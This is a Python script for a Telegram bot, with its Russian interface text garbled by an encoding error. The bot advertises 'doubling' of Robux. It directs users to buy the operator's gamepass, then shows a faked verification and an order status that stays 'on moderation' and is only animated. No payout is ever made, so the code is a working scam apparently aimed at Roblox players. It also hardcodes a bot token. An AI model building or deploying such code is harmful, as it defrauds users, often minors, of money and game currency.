import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from datetime import datetime

# –¢–í–û–ô –¢–û–ö–ï–ù
BOT_TOKEN = "7611120747:AAEykNg1YUGmHtDKkOlp_8qfmcaDhAS0ay0"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_orders = {}

# === –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã ===
main_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton("‚ùî –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç", callback_data="how_it_works")],
    [InlineKeyboardButton("‚öñÔ∏è –û–±–º–µ–Ω—è—Ç—å Robux", callback_data="exchange")],
    [InlineKeyboardButton("üëî –ü—Ä–æ—Ñ–∏–ª—å", callback_data="profile")]
])

amount_kb = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text=str(i), callback_data=f"amount_{i}")]
    for i in [5, 10, 25, 35, 50, 100, 250, 500, 1000, 1500]
])

# === /start ===
@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    msg = await message.answer("üí¨ –•–µ–π! –Ø 2XRBX, —è –ø–æ–º–æ–≥—É —Ç–µ–±–µ –ø–æ–ª—É—á–∏—Ç—å –±–æ–ª—å—à–∏–µ —Å—É–º–º—ã robux.")
    await asyncio.sleep(2)
    await msg.edit_text("‚ùî –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç\n\n–í—Å–µ –ø—Ä–æ—Å—Ç–æ! –¢—ã –¥–æ–Ω–∞—Ç–∏—à—å –≤ –Ω–∞—à–µ–≥–æ –±–æ—Ç–∞ –æ—Ç 5 Robux –¥–æ 1500, –∞ –±–æ—Ç —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç –∏—Ö –Ω–∞ 2x –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ç–µ–±–µ.üß®")
    await asyncio.sleep(3)
    await msg.edit_text("–ù—É —á—Ç–æ‚ùîüòâ", reply_markup=main_kb)

# === –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç ===
@dp.callback_query_handler(lambda c: c.data == "how_it_works")
async def how_it_works(callback: types.CallbackQuery):
    await callback.message.edit_text("‚ùî –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç\n\n–í—Å–µ –ø—Ä–æ—Å—Ç–æ! –¢—ã –¥–æ–Ω–∞—Ç–∏—à—å –≤ –Ω–∞—à–µ–≥–æ –±–æ—Ç–∞ –æ—Ç 5 Robux –¥–æ 1500, –∞ –±–æ—Ç —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç –∏—Ö –Ω–∞ 2x –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ç–µ–±–µ.üß®", reply_markup=main_kb)

# === –û–±–º–µ–Ω—è—Ç—å Robux ===
@dp.callback_query_handler(lambda c: c.data == "exchange")
async def exchange(callback: types.CallbackQuery):
    await callback.message.edit_text("–û—Ç–ª–∏—á–Ω—ã–π –≤—ã–±–æ—Ä, –≤—ã–±–µ—Ä–∏ –∫–æ–ª-–≤–æ Robux –∏ —è —É–¥–≤–æ—é —ç—Ç–æ –Ω–∞ 2x.", reply_markup=amount_kb)

# === –í—ã–±–æ—Ä —Å—É–º–º—ã ===
@dp.callback_query_handler(lambda c: c.data.startswith("amount_"))
async def choose_amount(callback: types.CallbackQuery):
    amount = int(callback.data.split("_")[1])
    user_id = callback.from_user.id

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º "–∑–∞–∫–∞–∑"
    order_id = len(user_orders.get(user_id, [])) + 1
    order = {
        "id": order_id,
        "amount": amount,
        "date": datetime.now().strftime("%d.%m.%y"),
        "status": "‚è≥ –ù–∞ –º–æ–¥–µ—Ä–∞—Ü–∏–∏"
    }
    user_orders.setdefault(user_id, []).append(order)

    kb = InlineKeyboardMarkup().add(InlineKeyboardButton("üõí –ö—É–ø–∏—Ç—å –≥–µ–π–º–ø–∞—Å—Å", url="https://roblox.com"))  # –í—Å—Ç–∞–≤—å —Å—Å—ã–ª–∫—É –Ω–∞ —Å–≤–æ–π –≥–µ–π–º–ø–∞—Å—Å
    await callback.message.edit_text("–•–æ—Ä–æ—à–æ, —á—Ç–æ–±—ã –∫—É–ø–∏—Ç—å –≥–µ–π–º–ø–∞—Å—Å –Ω–∞–∂–º–∏ –Ω–∞ –∫–Ω–æ–ø–∫—É.", reply_markup=kb)

    # –ò–º–∏—Ç–∏—Ä—É–µ–º –ø–µ—Ä–µ—Ö–æ–¥ –∏ –ø—Ä–æ–≤–µ—Ä–∫—É
    await asyncio.sleep(2)
    await bot.send_message(user_id, "–ü—Ä–æ–≤–µ—Ä–∫–∞‚Ä¶")
    await asyncio.sleep(2)
    await bot.send_message(user_id, "–û—Ç–ª–∏—á–Ω–æ, –ø—Ä–æ–≤–µ—Ä–∫–∞ –≥–µ–π–º–ø–∞—Å—Å–∞ –∏ –Ω–∞—á–∏—Å–ª–µ–Ω–∏–µ Robux –ø–æ–π–¥—É—Ç –Ω–∞ –º–æ–¥–µ—Ä–∞—Ü–∏—é. –¢—ã –º–æ–∂–µ—à—å –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å —ç—Ç–æ –≤ —Å–≤–æ–µ–º –ø—Ä–æ—Ñ–∏–ª–µ –≤ –ø—É–Ω–∫—Ç–µ –∑–∞–∫–∞–∑–æ–≤.üõçÔ∏è")

# === –ü—Ä–æ—Ñ–∏–ª—å ===
@dp.callback_query_handler(lambda c: c.data == "profile")
async def profile(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    username = callback.from_user.username or "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"
    orders = user_orders.get(user_id, [])
    kb = InlineKeyboardMarkup().add(InlineKeyboardButton("üè¨ –ú–æ–∏ –∑–∞–∫–∞–∑—ã", callback_data="orders"))
    await callback.message.edit_text(f"üë§ @{username}\n–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∑–∞–∫–∞–∑–æ–≤: {len(orders)}", reply_markup=kb)

# === –ú–æ–∏ –∑–∞–∫–∞–∑—ã ===
@dp.callback_query_handler(lambda c: c.data == "orders")
async def show_orders(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    orders = user_orders.get(user_id, [])
    
    if not orders:
        await callback.message.edit_text("–£ —Ç–µ–±—è –ø–æ–∫–∞ –Ω–µ—Ç –∑–∞–∫–∞–∑–æ–≤.")
        return

    text = ""
    for o in orders:
        text += f"–ó–∞–∫–∞–∑ #{o['id']}\n{o['date']}\n{o['amount']} R$\n{o['status']}\n\n"

    await callback.message.edit_text(text)

    # "–ê–Ω–∏–º–∞—Ü–∏—è" ‚è≥ ‚Üí ‚åõÔ∏è
    for _ in range(5):
        await asyncio.sleep(1)
        for o in user_orders[user_id]:
            if "‚è≥" in o["status"]:
                o["status"] = o["status"].replace("‚è≥", "‚åõÔ∏è")
            else:
                o["status"] = o["status"].replace("‚åõÔ∏è", "‚è≥")
        text = ""
        for o in orders:
            text += f"–ó–∞–∫–∞–∑ #{o['id']}\n{o['date']}\n{o['amount']} R$\n{o['status']}\n\n"
        await callback.message.edit_text(text)

# === –ó–∞–ø—É—Å–∫ ===
if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
